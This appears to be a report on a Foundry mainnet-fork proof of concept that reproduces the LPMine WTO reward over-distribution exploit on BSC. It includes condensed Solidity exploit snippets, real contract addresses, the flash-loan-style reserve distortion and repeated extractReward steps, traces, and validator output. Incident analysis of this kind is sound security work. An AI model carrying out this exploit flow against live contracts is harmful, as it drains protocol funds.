# LPMine WTO Over‑Distribution PoC (Forge Mainnet‑Fork Test)

## 1. Overview & Context

This Proof of Concept (PoC) reproduces the LPMine WTO over‑distribution incident on BSC by exercising the same vulnerable reward‑calculation path that allowed an unprivileged attacker to over‑claim WTO rewards from the on‑chain `RewardPool` contract and convert them into net BNB profit.

The PoC:
- Forks BSC mainnet at block `45,583,892`, matching the incident snapshot.
- Interacts directly with the real LPMine (`0x6BBeF6DF8db12667aE88519090984e4F871e5feb`), `RewardPool` (`0x3200Be834b791D09017Bd924c71174e47959b087`), WTO, ZF, USDT, and PancakeSwap pairs/routers.
- Uses a locally deployed helper contract plus Foundry cheatcodes to recreate the flash‑loan‑style reserve distortion and repeatedly call `LPMine::extractReward(1)`.
- Demonstrates material WTO depletion from `RewardPool` and a positive BNB profit for a fresh attacker address, in line with the incident economics.

The PoC validates the root cause described in `root_cause_report.md`: LPMine mis‑prices LP value using flash‑loan‑sensitive AMM reserves and allows repeated `extractReward(1)` calls to drain WTO from the TokenDistributor reward pool without proper accounting on the COAR/ZF leg.

**Command to run the PoC**

Run from the repository root:

```bash
cd forge_poc
RPC_URL="<your_BSC_mainnet_QuickNode_URL>" forge test --via-ir -vvvvv -m test_exploit_end_to_end
```

The validator run used a BSC QuickNode URL injected via `RPC_URL` and wrote detailed traces to:

```bash
/home/ziyue/TxRayExperiment/incident-202512271019/artifacts/poc/poc_validator/forge-test.log
```

## 2. PoC Architecture & Key Contracts

### 2.1 Main Contracts and Roles

- **LPMine (`ILPMine`)** – On‑chain liquidity mining contract on BSC. Accepts LP tokens and computes WTO/COAR rewards using AMM reserves and router quotes. Exposes:
  - `partakeAddLp(uint256 tokenId, uint256 tokenAmount, uint256 usdtAmount, address inviter)`
  - `extractReward(uint256 tokenId)`
- **RewardPool (`ITokenDistributor`)** – Token distributor created by LPMine. Holds WTO rewards and exposes:
  - `_owner()` – expected to be LPMine.
  - `_admin()` – referral/admin address.
- **Tokens / Pairs**
  - WTO (`WTO_ADDR`), ZF (`ZF_ADDR`), USDT (`USDT_ADDR`), WBNB (`WBNB_ADDR`).
  - Pancake V2 pairs: `ZF_USDT_PAIR_ADDR`, `WTO_USDT_PAIR_ADDR`.
- **Routers / Pools**
  - Pancake V2 router `PANCAKE_ROUTER_V2_ADDR` for swaps and LP creation.
  - V3 flash pool `FLASH_POOL_ADDR` (documented but simulated using `deal` in the PoC).
  - UniversalRouter `UNIVERSAL_ROUTER_ADDR` (not invoked directly in the PoC; its behavior is mirrored via router calls).

### 2.2 Local Helper Contract

The PoC introduces a local helper contract that mirrors the incident helper’s behavior but is entirely test‑local:

```solidity
// From test/Exploit.sol: HelperAttacker skeleton
contract HelperAttacker {
    IPancakeV3Pool public immutable flashPool;
    IPancakeRouterV2 public immutable routerV2;
    ILPMine public immutable lpmine;
    IERC20 public immutable usdt;
    IERC20 public immutable zf;
    IERC20 public immutable wto;

    address public attackerEOA;

    function setAttacker(address _attacker) external { ... }

    function setupStake(uint256 tokenId, uint256 zfAmount, uint256 usdtAmount, address inviter) external { ... }

    function executeFlashAndExploit(uint256 amountUSDT, uint256 repeats) external { ... }
}
```

Key responsibilities:
- **`setupStake`** – stakes a ZF/USDT LP‑like position into LPMine (`tokenId = 2`) to initialize `coarLpAmount` (reusing the incident’s COAR leg slot).
- **`executeFlashAndExploit`** – takes a large transient USDT balance (simulating a flash loan), swaps it through the ZF/USDT pair to inflate reserves, then repeatedly calls `lpmine.extractReward(1)` to over‑claim WTO.

### 2.3 Test Harness

The primary test contract is `ExploitTest` in `forge_poc/test/Exploit.sol`:

```solidity
// From test/Exploit.sol: key fields
contract ExploitTest is Test {
    address constant LPMINE_ADDR = 0x6BBeF6DF8db12667aE88519090984e4F871e5feb;
    address constant REWARD_POOL_ADDR = 0x3200Be834b791D09017Bd924c71174e47959b087;
    address public attacker;
    HelperAttacker public helper;

    function setUp() public {
        string memory rpc = vm.envString("RPC_URL");
        vm.createSelectFork(rpc, 45_583_892);
        attacker = makeAddr("attacker");
        helper = new HelperAttacker(...);
        helper.setAttacker(attacker);
        deal(attacker, 50 ether);
        // Oracle pre‑checks: RewardPool funding, ownership, ZF/USDT liquidity
    }

    function test_exploit_end_to_end() public { ... }
}
```

This harness:
- Forks BSC mainnet at the incident block with `vm.createSelectFork`.
- Uses a fresh logical `attacker` address (no real EOA from the incident).
- Deploys a local `HelperAttacker` and wires it to the on‑chain LPMine, RewardPool, and AMM contracts.
- Performs oracle pre‑checks to ensure the forked state matches expectations before running the exploit.

## 3. Adversary Execution Flow

### 3.1 High‑Level Steps

The PoC’s `test_exploit_end_to_end` encodes a complete ACT flow:

1. **A (Adversary funding & staking)**
   - Fund attacker with BNB.
   - Swap BNB → USDT and USDT → ZF on Pancake V2.
   - Stake the resulting ZF/USDT leg into LPMine via `HelperAttacker.setupStake`, binding to the real referral address.
2. **C (Configuration & state distortion)**
   - Warp time forward to accrue WTO rewards.
   - Use a large transient USDT position (via `deal`) to simulate a flash loan.
   - Swap transient USDT through the ZF/USDT pair to inflate reserves and token price.
3. **T (Transaction / exploit execution and profit)**
   - Repeatedly call `LPMine::extractReward(1)` while reserves are distorted to over‑claim WTO from RewardPool.
   - Swap helper’s WTO → USDT → WBNB and unwrap WBNB → BNB.
   - Assert that the attacker ends with a positive net BNB profit and RewardPool loses a material amount of WTO.

### 3.2 Key Test Snippet

The core exploit flow in `test_exploit_end_to_end`:

```solidity
// From test/Exploit.sol: condensed exploit flow
uint256 attackerBNBBefore = attacker.balance;
uint256 rewardPoolWTOBefore = wtoToken.balanceOf(REWARD_POOL_ADDR);
uint256 helperWTOBefore = wtoToken.balanceOf(address(helper));

// Stage 1: setup – swap BNB -> USDT/ZF and stake into LPMine
uint256 initialBNBForSetup = 5 ether;
vm.prank(attacker);
routerV2.swapExactETHForTokensSupportingFeeOnTransferTokens{value: initialBNBForSetup}(...);
// swap half USDT into ZF, transfer ZF/USDT to helper, stake via helper.setupStake(2, ...)

vm.warp(block.timestamp + 3 days);

// Stage 2: exploit – flash‑style USDT injection and repeated extractReward
uint256 flashAmount = 500_000 * 1e18;
uint256 repeats = 5;
deal(USDT_ADDR, address(helper), flashAmount);
vm.prank(attacker);
helper.executeFlashAndExploit(flashAmount, repeats);

// Stage 3: realization – swap helper WTO into BNB for attacker
uint256 helperWTO = wtoToken.balanceOf(address(helper));
// swap WTO -> USDT -> WBNB, then WBNB -> BNB and credit attacker
```

**Caption:** End‑to‑end exploit flow: funding, staking, reserve distortion, repeated `extractReward(1)`, and conversion of WTO rewards into BNB for the attacker.

### 3.3 Trace Evidence

From the validator trace (`forge-test.log`):

```text
[PASS] test_exploit_end_to_end() (gas: 1256169)
...
WTO::balanceOf(RewardPool)  -> 4.026e26  (before)
...
WTO::balanceOf(RewardPool)  -> 3.613e26  (after)
...
WBNB::withdraw(attacker, 9.150794574297319607e18)
...
Suite result: ok. 1 passed; 0 failed
```

**Caption:** Trace excerpt showing WTO leaving RewardPool and WBNB/BNB delivered to the logical attacker on the forked mainnet state.

## 4. Oracle Definitions and Checks

The PoC is guided by `oracle_definition.json`, which defines variables, pre‑checks, and hard/soft constraints for success.

### 4.1 Variables

Relevant variables from the oracle:
- `attacker` – logical adversary EOA (fresh in the PoC).
- `attacker_helper` – attacker‑controlled helper contract deployed locally.
- `lpmine` – on‑chain LPMine contract.
- `rewardPool` – TokenDistributor holding WTO rewards.
- `wtoToken`, `zfToken`, `usdtToken`, `wbnbToken` – on‑chain ERC‑20 tokens.
- `zfUsdtPair`, `wtoUsdtPair` – Pancake V2 pools used for pricing and routing.
- `bnb` – native chain asset used as the profit reference.

These are instantiated in `ExploitTest` as constants and typed fields, matching the on‑chain addresses from the root‑cause analysis.

### 4.2 Pre‑checks

The oracle defines three pre‑checks; all are implemented in `setUp()`:

```solidity
// RewardPool must start funded with WTO
uint256 rewardPoolWTOBefore = wtoToken.balanceOf(REWARD_POOL_ADDR);
assertGt(rewardPoolWTOBefore, 0, "rewardPool should start with non-zero WTO balance");

// RewardPool ownership and binding to LPMine
assertEq(rewardPool._owner(), LPMINE_ADDR, "TokenDistributor owner must be LPMine");
assertEq(address(lpmine.rewardPool()), REWARD_POOL_ADDR, "LPMine must use the configured rewardPool");

// ZF/USDT pair liquidity pre‑check
assertGt(zfToken.balanceOf(ZF_USDT_PAIR_ADDR), 0, "ZF/USDT pair must have ZF liquidity");
assertGt(usdtToken.balanceOf(ZF_USDT_PAIR_ADDR), 0, "ZF/USDT pair must have USDT liquidity");
```

**Caption:** Oracle pre‑checks enforcing initial RewardPool funding, ownership wiring, and non‑empty ZF/USDT liquidity on the forked state.

### 4.3 Hard Constraints

The oracle’s hard constraints are mapped as follows:

- **HC1_rewardPoolOwnerLink (ownership)**
  - Spec: RewardPool `_owner` must remain LPMine.
  - Test: `assertEq(rewardPool._owner(), LPMINE_ADDR, "rewardPool owner should be LPMine");`
- **HC2_lpmineRewardPoolBinding (state invariant)**
  - Spec: LPMine’s `rewardPool()` reference must point to the WTO‑funded TokenDistributor.
  - Test: `assertEq(address(lpmine.rewardPool()), REWARD_POOL_ADDR, "LPMine must use the configured rewardPool");`
- **HC3_rewardPoolWTODepletionDirection (state invariant)**
  - Spec: RewardPool’s WTO balance must strictly decrease over the exploit.
  - Test:
    ```solidity
    uint256 rewardPoolWTOBefore = wtoToken.balanceOf(REWARD_POOL_ADDR);
    ...
    uint256 rewardPoolWTOAfter = wtoToken.balanceOf(REWARD_POOL_ADDR);
    assertLt(rewardPoolWTOAfter, rewardPoolWTOBefore, "rewardPool must lose WTO during exploit");
    ```
- **HC4_profitAssetIsBNB (asset type)**
  - Spec: Profit measured in native BNB.
  - Test: The PoC measures `attacker.balance` before/after and uses BNB‑denominated thresholds (see SC1 below), effectively binding profit measurement to BNB.

### 4.4 Soft Constraints

Soft constraints capture economic strength of the exploit:

- **SC1_attackerNetBNBProfit (attacker profit)**
  - Spec: Attacker ends with ≥ 0.1 BNB net profit.
  - Test:
    ```solidity
    uint256 attackerBNBBefore = attacker.balance;
    ...
    uint256 attackerBNBAfter = attacker.balance;
    assertGe(attackerBNBAfter - attackerBNBBefore, 0.1 ether, "attacker must gain at least 0.1 BNB net");
    ```
- **SC2_rewardPoolWTOMaterialDepletion (victim depletion)**
  - Spec: RewardPool loses at least `1,000` WTO units (assuming 18 decimals).
  - Test:
    ```solidity
    assertGe(
        rewardPoolWTOBefore - rewardPoolWTOAfter,
        1000 ether,
        "rewardPool must lose at least 1,000 WTO units"
    );
    ```
- **SC3_attackerClusterWTOCapture (attacker WTO inflow)**
  - Spec: Helper contract must receive a positive amount of WTO.
  - Test:
    ```solidity
    uint256 helperWTOBefore = wtoToken.balanceOf(address(helper));
    ...
    uint256 helperWTOMid = helperWTO;
    assertGt(helperWTOMid - helperWTOBefore, 0, "attacker helper must receive WTO rewards");
    ```

Together, these checks show that the PoC doesn’t merely run a transaction—it demonstrates real WTO extraction from RewardPool and a positive BNB payout to the adversary.

## 5. Validation Result and Robustness

The validator wrote its structured result to:

```bash
/home/ziyue/TxRayExperiment/incident-202512271019/artifacts/poc/poc_validator/poc_validated_result.json
```

### 5.1 Summary of Validation JSON

Key fields:

```json
{
  "overall_status": "Pass",
  "poc_correctness_checks": {
    "passes_validation_oracles": {
      "passed": "true",
      "reason": "All hard and soft oracle constraints ... enforced ..."
    }
  },
  "poc_quality_checks": {
    "oracle_alignment_with_definition": { "passed": "true", ... },
    "human_readable_and_labeled": { "passed": "true", ... },
    "no_magic_numbers_and_values_are_derived": { "passed": "true", ... },
    "mainnet_fork_no_local_mocks": { "passed": "true", ... },
    "self_contained_no_attacker_side_artifacts": {
      "no_attacker_eoa_addresses": { "passed": "true", ... },
      "no_attacker_deployed_contract_addresses": { "passed": "true", ... },
      "no_attacker_artifacts_or_calldata": { "passed": "true", ... }
    },
    "end_to_end_attack_process_described": { "passed": "true", ... },
    "alignment_with_root_cause": { "passed": "true", ... }
  },
  "artifacts": {
    "validator_test_log_path": ".../forge-test.log"
  },
  "hints": []
}
```

**Caption:** Validator JSON excerpt confirming that the PoC passes both correctness (oracles) and quality checks, with no additional refinement hints required.

### 5.2 Robustness Considerations

- The PoC uses the real on‑chain contracts at the incident block, so changes to those contracts would require updating the fork block or addresses.
- Flash‑loan behavior is simulated via `deal` + swaps rather than calling `flashPool.flash` directly; this preserves the economic incentives (reserve distortion and reward mis‑calculation) without depending on V3 flash implementation details.
- Numeric parameters (flash amount, time warp, thresholds) are deliberately conservative but still demonstrate a materially profitable exploit and large WTO drain.

## 6. Linking PoC Behavior to Root Cause

### 6.1 Exercised Vulnerable Logic

The root cause report attributes the incident to LPMine’s reward logic:
- Uses AMM reserves and router price quotes (`getRemoveTokens`, `getEachReward`) that are sensitive to transient reserve changes.
- Double‑counts WTO rewards across multiple LP legs and fails to correctly gate repeated `extractReward(1)` calls on the COAR/ZF leg.
- Sends WTO payouts from RewardPool via `claimToken` under LPMine’s control.

In the PoC:
- `HelperAttacker.setupStake` initializes a large LP‑backed position for the attacker’s helper in the same slot (`tokenId = 2`) used for the COAR leg.
- `HelperAttacker.executeFlashAndExploit` temporarily inflates ZF/USDT reserves with a large USDT injection and repeatedly calls `lpmine.extractReward(1)` while the reserves are distorted.
- The forked state ensures that the same on‑chain LPMine and RewardPool code paths are executed as in the real incident.

### 6.2 Victim Loss and Attacker Profit

The PoC’s assertions and traces connect directly to the root‑cause economics:

- **Victim loss (RewardPool WTO depletion)**
  - The test asserts both directional depletion (`rewardPoolWTOAfter < rewardPoolWTOBefore`) and minimum magnitude (≥ 1,000 WTO).
  - Traces show WTO leaving RewardPool and flowing through the helper before being swapped.
- **Attacker profit (BNB)**
  - The attacker’s BNB balance is measured before and after the exploit, and the test requires a ≥ 0.1 BNB net gain.
  - Traces show WBNB transfers and `WBNB.withdraw` calls that deliver BNB to the attacker on the forked mainnet.

### 6.3 ACT Framing

Under the ACT framing:

- **A (Adversary‑crafted steps)**
  - Funding attacker with BNB, configuring the helper, staking into LPMine, and injecting transient USDT are all adversary‑crafted actions controlled in the test.
- **C (Configuration / contract interactions)**
  - Interactions with LPMine, RewardPool, Pancake pairs, and router configure protocol state so that the mis‑priced rewards become claimable.
- **T (Transaction / exploit predicate)**
  - The repeated `extractReward(1)` calls and final swaps that turn WTO into BNB satisfy the exploit predicate: RewardPool loses WTO, and the attacker ends with more BNB than they started with.

Overall, the Forge PoC faithfully reproduces the vulnerable flow, validates the oracle‑defined success criteria, and demonstrates the exploit on a BSC mainnet fork without depending on any attacker‑specific artifacts from the original incident.

